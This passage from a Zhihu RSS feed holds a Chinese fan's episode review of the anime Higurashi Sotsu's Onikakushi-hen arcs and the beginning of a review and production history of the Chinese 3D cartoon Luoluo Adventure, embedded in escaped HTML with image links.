data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 本篇很明显能看出《罪灭篇》的成分：礼奈的父亲遭遇间宫莉娜、礼奈开始回想过去的的不幸以及自己从礼奈变成蕾娜的契机，这些都是罪灭篇的基本配置。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c18235e6a24b16838266fa9f7737ecea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bc2f61eaf9c4c5ab14b41da730267719_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4db6ace9f6ab0999a10d13a3b57ae505_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 本作承袭《业》中的「镜像翻转」要素，在一些场景中以镜像作为暗示，譬如下图中的沙都子，在窗户中的倒影是轮回者状态。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9139a72234ba4392fabb407fd703504b_720w.jpg?rss\" data-caption=\"注意眼睛\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 本集中明确了骗篇的凶手应该都是因为沙都子的注射而发病的，而结合铁平与下一集的莉娜，此处有一种可能，那就是在业力的影响下，各个碎片的凶手和发病者都会主动去回避曾经的错误，导致每个碎片在不被沙都子干涉的情况下都可以走向幸福的结局。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c6c7c163b68a3b42dd8b9e32cecfdb01_720w.jpg?rss\" data-caption=\"沙都子为礼奈施打药物\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e66175e98e2283cdb92d47054126f0ae_720w.jpg?rss\" data-caption=\"礼奈睡得真沉...\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 礼奈在药物的影响下进入了发病的状态，并且不由自主地回想起来过去与母亲之间不愉快的回忆。值得一提的是，旧作里礼奈的父母应该都是没露脸的，不过本次倒是都老老实实地画了出来；礼奈母亲怀孕的细节得到了强调，不知道是否是在为与《命》的联动作铺垫（《命》主角之一的凤谷菜央是礼奈同母异父的妹妹，就是此处腹中的胎儿）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-18597a2b0e80475fa0c41c3afe6783b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-63f88057c539856b55de5204c306cb65_720w.jpg?rss\" data-caption=\"跟小学生说这种话，真的大丈夫？\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 礼奈发病后有大量自言自语的场景，这虽然显得有点解说性过强，但配合发病时的癫狂来看还挺带感的。不得不说，本作里对于lv5状态时的疯狂姿态描绘得非常好，观赏性要远大于旧作。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-26fac28c9f9bd2520381890a611c0857_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1c6d87f1e76cbb5ad7a66be55cbbd160_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-64dd7121ee7797f1a521b335cc4cc52a_720w.jpg?rss\" data-caption=\"这张礼奈好可爱啊\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 和铁平相似，这个碎片中的莉娜也开始良心发现，从一开始就没有作恶的动机。所以本篇本来可以走向一个幸福的结局（毕竟铁平和鹰野也不会搞事），但在沙都子的介入下被破坏了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d8d85ac1317e8086fbe437c4a170ba2d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-937215a84c1fe9206bf08da9dae4ae6a_720w.jpg?rss\" data-caption=\"这样的莉娜很少见，令我对原本纯黑的她产生了一丝怜悯\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<h2>7.2 鬼明篇：其二</h2>\n<p>（因为这集还没中文资源，所以只能在Hulu上一边看一边用手机拍照了）</p>\n<p>• 礼奈开始进行谋杀的准备，恰好碰上莉娜自己找上门来。值得一提的是，似乎是为了映衬礼奈的这种癫狂状态，这个夕阳西下的场景里，配色也有一种妖异的感觉，让人想起了「さよならを教えて」。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c321cd23d70fc86963ca366ccfe1a839_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b46f6f2738d44d873e6ad4ec1e1cb2f2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 在礼奈的秘密据点内，莉娜想要对她敞开心扉，结果被发狂的礼奈袭击。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-af526b91b19f2f8dd39568ef24a97cfb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7b608ed7a23bb0a2edbb61d7f5cdba13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 不得不说，礼奈在本集的发狂场景作画非常不错，狂乱之余，不失魄力。值得一提的是，因为注射所导致的发病状态，似乎和自然发病是存在区别的，譬如这里的礼奈就比罪灭篇要更具有侵略性。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-218a4a0c805471ce119db135ce3bc1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-bd17c04b14768e58db01b7533cb68a1b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b17a0efba457fe5d118de8b80644d5f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 沙都子就在案发现场的山坡上远远观望，此处的构图与《业》第一集时梨花俯瞰圭一的场景一模一样，再度强调了立场和视角的反转。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c105c778c1df125d3dd7127431ba487e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3da66c9dfc57c0fbea3f7e2b2addd5d5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 第二天，试图在垃圾山继续处理尸体的礼奈，碰上了追寻她而来的圭一，并开始疑神疑鬼。这个疑心状态下的礼奈，在其表情的描绘上，风格比较写实化，因而产生了一种奇妙的反差，个人非常喜欢。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9fb706752e6089cd73ea00023cccad8b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4ab20761a812eb0b858733971132acb5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 礼奈在回家的路上遇见了大石，得知警方在调查间宫莉娜的失踪，因而承受了更多的精神压力。不过，即使是在这样的状态下，她也没有让大石看出破绽，可见礼奈的自制能力和冷静程度都非常可怕。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-39239679db952d647229cab7b2c46303_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<h3>关于前两集的简评</h3>\n<p>• 相较于《业》来说，《卒》的前两集可以说是照常发挥，各方面延续了《业》的特点以外，也继承了「新内容+剧情复盘」的模式，可见制作方对《卒》仍旧抱有拉新观众入坑的期望。</p>\n<p>• 可能是为了与《业》对接，《卒》中有不少直接从《业》里照搬的段落和画面，不过也许是因为这一点节省了开支，所以在新场面的描绘上有了更好的发挥，譬如这两集中礼奈发病的场面。</p>\n<p>• 结合《乡坏篇》和《鬼明篇》来看，出题篇之所以命名为《业》，大概是因为每个角色都要为自己曾经的罪业付出代价，因而与为自己所拖累的人进行了位置的转换，从被害者变成了加害者，所以之后的绵明篇和祟明篇大概也是类似的走向。</p>\n<p>• 总觉得《卒》的画风好像变得更顺眼了，不知道是因为自己看习惯了，还是绘柄真的变了，总觉得之前的那种肥而圆的感觉好像没有那么明显了。</p>\n<h2>7.8 鬼明篇：其三</h2>\n<p>• 这集不论是节奏还是作画方面都像是个总集篇... 少量的新画面加上大量从业照搬过来的旧画面，算是把鬼骗篇后续的一部分给解答了，但是这些解释并不是非常令人满意。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-64023df551e60de323cbb11487cefa62_720w.jpg?rss\" data-caption=\"而且一部分新画面相当敷衍，甚至可以说是崩坏\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-64023df551e60de323cbb11487cefa62\" data-watermark-src=\"v2-21342095da46a7d35450a2cba9278f83\" data-private-watermark-src=\"v2-689421da7406883137268c1ac6b1d876\"></p>\n<p><br></p>\n<p>• 鬼骗篇最令人好奇的地方就在于礼奈刺杀圭一前后的一系列细节，但是这一部分在鬼明篇中占的篇幅非常至少，而且并没有什么令人震惊的真相 —— 礼奈的发疯是切实的，而且直到最后也没有从lv5状态中恢复（这似乎意味着注射导致的发病是无法解除的，因为礼奈有过数次从lv5状态自愈的案例），而圭一也并没出现幻觉，仅仅是在最后发病了而已。</p>\n<p>• 本集的经典表情合集：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5c9f630dec0dd85b231222040721a488_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-5c9f630dec0dd85b231222040721a488\" data-watermark-src=\"v2-a7779161a14349a9a8925ddc8fe490c7\" data-private-watermark-src=\"v2-b35f55b4132c5374e47d5a4d82f7f44f\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d1821941d69b0bcf07a00138d09fe8e0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-d1821941d69b0bcf07a00138d09fe8e0\" data-watermark-src=\"v2-a656b6dddb14ab8c6093b7e1e0884590\" data-private-watermark-src=\"v2-88b3d5d730b76a6115b286eef3db91a1\"></p>\n<p><br></p>\n<p>• 梨花被打脸合集：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ac047fd27ba348a349f7b65a93875a13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-ac047fd27ba348a349f7b65a93875a13\" data-watermark-src=\"v2-06aefcb0a2356be82919099857216601\" data-private-watermark-src=\"v2-8ff8e57facab1a4f7d12fc09f17963e6\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7b724c5925a558e0920221a6d54a1f9f_720w.jpg?rss\" data-caption=\"严格来说也没错，圭一确实靠闹钟打赢了菜刀，一战（再度）成名\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-7b724c5925a558e0920221a6d54a1f9f\" data-watermark-src=\"v2-606ee783a3b4d9cb5225e7d803f55075\" data-private-watermark-src=\"v2-228f9b162563fccbc677f11a041dca3c\"></p>\n<p><br></p>\n<p>• 梨花和沙都子还真就是先后自杀：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-59c3928e9554b056673b3a7622ca7e03_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-59c3928e9554b056673b3a7622ca7e03\" data-watermark-src=\"v2-d0077419112df79495aabee48cf0b49d\" data-private-watermark-src=\"v2-271036a6ddcaaa571ada13d5a7efc297\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ae02b41d08370377b0ba97917acf57ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-ae02b41d08370377b0ba97917acf57ae\" data-watermark-src=\"v2-552356d822ef31261ae39c97882ecd3c\" data-private-watermark-src=\"v2-e6a23075a34fcc695c367bf130a43f30\"></p>\n<p><br></p>\n<p>• 制作组好像真的很喜欢沙都子，从业到现在涉及到沙都子的画面基本上都没啥大的崩坏，甚至可以说是精致：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a8adb805335efbef4f3a6b5fe5363a8c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-a8adb805335efbef4f3a6b5fe5363a8c\" data-watermark-src=\"v2-2e6308f51c0cde1a61b3a22e3cf97ec0\" data-private-watermark-src=\"v2-ab36b4129a757259676ca678db3f8f79\"></p>\n<p><br></p>\n<p>• 鬼明篇最后一集暴露出了《卒》的一个重大问题，那就是对于「解答方式」的不当处理。在猫骗篇和乡坏篇的铺垫之上，《业》前三篇的许多谜题其实已经不需要像鬼明篇这样按部就班地进行解读了，有寒蝉原作基础的观众靠自己的推理可以厘清大部分的谜题。或者说，这种仿佛游戏第二周目一样调换视角、补充隐藏要素的解答方式，必然会出现大量的复述性和回顾性内容，而这对观众的观看体验来说，很难起到正面作用，甚至会令人觉得这是在有意凑篇幅和水剧情。实际上谜题复杂程度更高的寒蝉本篇，当初在写解答篇的时候也是用了完全不同的故事来间接解答前篇的谜题，可见鬼明篇这样的解答篇是不合格的，也可以说是脚本家偷懒的结果。</p>\n<p>• 如果之后的两个解答篇都和鬼明篇思路一致的话，那么留给《卒》的最后一个篇章的压力是非常巨大的，毕竟前三篇都只是用来撑长度和复盘剧情的，那么终章需要有足够多的爆点和足够强大的反转才能令读者满意，但龙七一向不善于填坑，那么关于《卒》整体风评的预期，大概不会很乐观...</p>\n<p>• 不论如何，还是很期待《绵明篇》，希望在《业》中没什么戏份的诗音可以有高光表现。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-625d165409c73368f1ca55ad4a1f48bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"840\" data-rawheight=\"392\" data-watermark=\"watermark\" data-original-src=\"v2-625d165409c73368f1ca55ad4a1f48bf\" data-watermark-src=\"v2-5d6e9e7bdefe13c5bcedb815672d9f0a\" data-private-watermark-src=\"v2-ba7e016c31ff18ad5b56fda7d3de0a87\" data-tags=\"politic\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/gris-griffith?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">岸边的塞涅卡</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469405052/answer/1974393667?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/322053588?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">看完并喜欢动画《寒蝉鸣泣之时》系列，可能会是怎样的人？</a><br><a href=\"http://www.zhihu.com/question/423143915?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价2020年10月开播的动画《寒蝉鸣泣之时》？</a><br>\n","link":"http://www.zhihu.com/question/469405052/answer/1974393667?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价洛洛历险记？","date":"2021-07-05 03:00:11","description":"\n<blockquote>其实，人生就是一场游戏，游戏就是一场人生。只不过这场游戏你想玩也得玩，不想玩也得玩。</blockquote>\n<p>《洛洛历险记》是蓝弧巅峰期的开始，亦是其巅峰期的结束。</p>\n<h3>背景</h3>\n<p>蓝弧动画的前身是蓝弧信息科技有限公司，创建日期为2003年，其法人为王巍，亦是导演多部蓝弧作品之人。</p>\n<p>03-07年，亦曾制作多过部动画，但是市场并无太大反响。</p>\n<p>而为他人打工而制作的《猪猪侠》则是却意外地火了。</p>\n<p>猪猪侠前四部，是猪猪侠其口碑最好之时，亦是蓝弧所制作。不过09年之后便不再参与制作，其导演以及编剧不再是王巍，现如今版权归属于广东咏声动漫股份有限公司。</p>\n<p>在此之后，猪猪侠剧情便越来越差，其IP价值也远不如以前。</p>\n<p>07-09年，蓝弧相继推出了《果冻宝贝》以及《果冻三剑客》，这两部动画可以说是《果宝特攻》的前传，但又不全是，因为很多概念都发生改变。这两部动画获得一定反响，或是星杰相中其实力，而前来与蓝弧合作。</p>\n<p>《洛洛历险记》里面的机车族，与变形金刚系列的汽车人有些相似，尤其是其变身方式。也是因此，有人称其为中国版的变形金刚。不过，也有人称《洛洛》抄袭《变形金刚》。</p>\n<p>不是，我在这里说一句。</p>\n<p>《洛洛历险记》与其相似是有缘故的，其IP来源有些许复杂，有点长。那就从其源头开始讲吧。</p>\n<p>美国有一个Tonka公司，在1982年生产了一个名为Go-Bots的机器人玩具，1983年改名为“百变雄师”，销量很高，买得比孩子宝还要好。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-46e709c1a73cb1268ea162d4a92bf0fa_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1468\" data-size=\"normal\" data-caption=\"看图便可知此物与变形金刚的差距\" data-watermark=\"original\" data-original-src=\"v2-46e709c1a73cb1268ea162d4a92bf0fa\" data-watermark-src=\"v2-4c170278910b67d2a97870da2157fcd4\" data-private-watermark-src=\"v2-60921c269f5968f511766e453ce74f79\"></p>\n<p>不过等到孩之宝创造了变形金刚系列之后，其形势便逆转了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c1847547d4908aed919a046939b20800_720w.jpg?rss\" data-rawwidth=\"420\" data-rawheight=\"597\" data-size=\"normal\" data-caption=\"差距一眼便得知\" data-watermark=\"original\" data-original-src=\"v2-c1847547d4908aed919a046939b20800\" data-watermark-src=\"v2-ba49232f509ab43e14aeb9df6bdf81cd\" data-private-watermark-src=\"v2-33d34ca63129dd5e93e47d67ece2b606\"></p>\n<p>此后，在1991年Tonka以及其《百变雄师》的版权被孩之宝收购。为了做出差异化处理，让其向子供向发展。</p>\n<p>待到榨干最后一滴价值时，便废置了它。</p>\n<p>而中国的星杰相中了它，便买下来并更名为“百变机兽”。</p>\n<blockquote>广州市星杰玩具有限公司成立于2003年，是一家集动漫产业的研发与生产，拍摄与制作，发行与销售，包装与配送于一体的综合性专业文化企业。<br>     一直以来，公司致力于右脑项目的开发，创作性思维为主的变形玩具的研制，先后推出十多个变形系列，上百余款变形产品，缔造了变形玩具销售奇迹，蜚声业界。<br>     公司拥有国内顶尖的创作、编剧、导演、摄像等核心制作团队，潜心原创动漫的创作。2008年斥巨资拍摄全球第一部注入中国武侠元素的52集全三维动画《百变机兽之洛洛历险记》，在全国省市电视台掀起了热播的狂潮，同名系列玩具“百变机兽”，瞬间风靡各地，并成为变形玩具的经典。<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\" data-text=\"\" data-url=\"http://starjet.b.ctoy.com.cn/\">[1]</sup>\n</blockquote>\n<p>上面是官网的介绍，不过就洛洛历险记的成片而言，并未展现其巨资，也许是蓝弧第一次做这种（战斗）作品，动作戏方面稍显拙劣。</p>\n<p>并且于2008年投资蓝弧，定好玩具的形象与名字，其它方面均由蓝弧负责。</p>\n<blockquote>于是星杰又找到蓝弧动画，由星杰提供玩具形象，蓝弧来改编动画，相当于动画是蓝弧原创的，只是人物名和造型是星杰早就定好的，这些造型来源就是原先孩之宝的百变雄师系列，然后经过改动而成的星杰百变机兽系列玩具。所以这里面的关系也就清晰了吧<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"2\" data-text=\"\" data-url=\"https://tieba.baidu.com/p/6176518550?red_tag=2325471446\">[2]</sup>\n</blockquote>\n<p>其动画名正是《百变机兽之洛洛历险记》。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-84d8aaf1fff0ffc8e3d32eea48a466aa_720w.jpg?rss\" data-rawwidth=\"752\" data-rawheight=\"560\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-84d8aaf1fff0ffc8e3d32eea48a466aa\" data-watermark-src=\"v2-f7a8d33f5424106779ad1c7408dbef02\" data-private-watermark-src=\"v2-3ffd9726067d66818a2b80b69d55bdda\"></p>\n<p>星杰要卖玩具，蓝弧需要钱做动画来展现自己的实力，二者一拍即合。</p>\n<p>就当时结果而言，这是一个双赢的局面。</p>\n<p>《洛洛历险记》大火，其玩具销量亦非常好。蓝弧也因这部动画名声大躁，也走向了巅峰期。</p>\n<p>不过，亦在此埋下一隐患，先按下不表。</p>\n<h3>原版</h3>\n<p>《洛洛历险记》是一部由蓝弧制作，集数为52集的3D动画。</p>\n<p>开头，洛洛在暴风雨天气下，仍在玩一个游戏。此游戏其名为《机战王》，此游戏为PvP游戏，里面有机车族与猛兽族方阵营。玩家必须选择一方阵营，然后与另一方阵营进行对战。</p>\n<p>洛洛在这游戏比赛中获得亚军。</p>\n<p>洛洛自然是机车族一方，此时正处于关键时刻，即使是其母亲让其不准打游戏，等她走后仍偷偷打开游戏机。之后便来到了经典桥段，异世界穿越。</p>\n<p>这个与《数码宝贝》的穿越方式类似，天上掉下几束光，便选中了几个主角。而《洛洛》这边自然也很朴素。仅仅只是一个雷电打下来，便穿越过去。</p>\n<p>之后，便开始了异世界之旅。</p>\n<p><b>情节优秀</b></p>\n<p>蓝弧在此处给洛洛安排的是标准的成长型主角剧本。即从零开始，自己与机车族一步步成长，最后与猛兽族能分庭抗礼。</p>\n<p>而此背景是一个机车族与猛兽族相互打仗的世界，机车族四分五裂，是一盘散沙。猛兽族虽然更甚，经常会互相暗算对方，但是有一点很重要，就是比机车族强，无论是其单兵实力，亦或者是其军队实力，都远比机车族强。</p>\n<p>不过机车族比猛兽族强的地方在于，机车族会有混合技，并且是刚刚好克制猛兽族一方的技能。</p>\n<p>并且，开挂相对而言并无多少，更多是智取，而非力敌。</p>\n<p>作为其面向对象（中小学生）而言，此剧本可称之为优秀，即便是成年后回头再看，同样可以顺畅地看下去，人物智商在线，并无太多降智与令人尴尬的情节。</p>\n<p>情节有转折，主线又异常清晰，地图亦更换得恰到好处，遇到之人亦随着人物实力增长而增长，始终处了一个水平当中。</p>\n<p>《洛洛》如若按照其地图划分，可分为时光之城篇、能源之城篇、风雪之城篇、最终决战篇。</p>\n<p>时光之城篇是洛洛进入游戏世界的第一个篇章，也是熟悉这个世界的第一个篇章，所以其对手并没有过强，只是狂野星手下的第一大将——金铁兽。不过为了给其相对应的实力，洛洛遇到的第一个机车族——霹雳火，亦是处于最弱状态，连其技能雷庭半月斩也使不出来。</p>\n<p>第一个篇章，是为了介绍其人物，以及世界观，更重要的是为下一篇章做辅垫。</p>\n<p>相对应的成长实力，洛洛遇到了历史最弱时期的霹雳火。霹雳火，据我所知，其名字出自于《水浒传》中秦明的外号。秦明以脾气暴躁而著称，而霹雳火则是典型的老好人。</p>\n<p>在第一次出场时，即使是敌人，也会劝其不必白白送死。</p>\n<p>于是便从零开始，一点点升级其实力，最后还是有惊无险地击退了金铁兽大军，并与力霸天、霹雳火以及风火轮一同前往能源之城。</p>\n<p>然后便开启了整部作品最优秀的篇章——能源之城篇章。</p>\n<p>这个篇章从第10集《见义勇为》到第35集《龙虎斗》，横跨25集，几乎所有人物悉数登场，能源之城，你方唱罢我方再登场。</p>\n<p>首先，开篇即进入高潮，猛虎王与狂野猩皆想夺取能源之城的能源紫水晶。二者为了争取攻打权，在能源之城外选择一处地方开战。</p>\n<p>猛虎王速度很快，但是很难破狂野猩的防，而狂野猩攻击力强，而速度则慢上许多，无法进猛虎王其身。</p>\n<p>二者各有强项，自身弱点皆是对方强项。这本应该是一场无法分出胜负的一场战斗，不过猛虎王选择用计谋，选用围殴战术，将狂野猩围殴致残。</p>\n<p>关键时刻金铁兽赶到，不过仍不是猛虎王对手，而关键时刻，机车族这边龙卷风、霹雳火和力霸王选择出手相救。这是一个弱肉强食的世界，即强者才能生存。可是除了弱肉强食，还有一群坚守原则的（机器）人。龙卷风讨厌人多欺少，猛虎王则一直喜欢以多欺少，二者正是水火不容的关系。而其霹雳火与力霸天则是极为看重义气，光明磊落之人自是见不惯诡计多端之人。</p>\n<p>人与人的感情，亦会影响其结果，后来洛洛的对手晶晶亦是如此。晶晶使用计谋将三个猛兽王移位，虽然狂野猩和猛虎王都将其对手逼入绝境。不过晶晶却忘了，就算棋子，也是会有个人情感的，棋子不应该不是毫无情感的，也要考虑棋子本身的情感方可成事。</p>\n<p>于是三者皆以不同原因而出手相救，最后都掉到熔浆下。不得不说，这个熔浆的设计是真的不错，熔浆则只是幻象，实则只是障眼法。所有的人都会惧怕掉入熔浆，而能源紫水晶刚好在其熔浆下面。</p>\n<p>最后，猛虎王以金铁兽为人质，换来狂野猩的退走，自此，能源之城的攻防战开始。</p>\n<p>能源之城的人物众多，自本身也是一个易守难攻的城池。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7adcabb92eaaca2599fbc288f8f18169_720w.jpg?rss\" data-rawwidth=\"1435\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"并且能源之城有空军优势\" data-watermark=\"original\" data-original-src=\"v2-7adcabb92eaaca2599fbc288f8f18169\" data-watermark-src=\"v2-25d257efe9031d9ced4bd9baba215d84\" data-private-watermark-src=\"v2-def0fa32c374556b35aa6bc45115c6d4\"></p>\n<p>正面强攻自然不行，于是猛虎王选择诱敌出来，通过歼灭其有生力量。再夺取城池。</p>\n<p>因为城主很谨慎，主动出击会导致一波被翻盘，所以即使是多次失败也不会导致人员损失惨重。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3d3d3b6a48d97c626a0aba34551a6cce_720w.jpg?rss\" data-rawwidth=\"822\" data-rawheight=\"621\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" 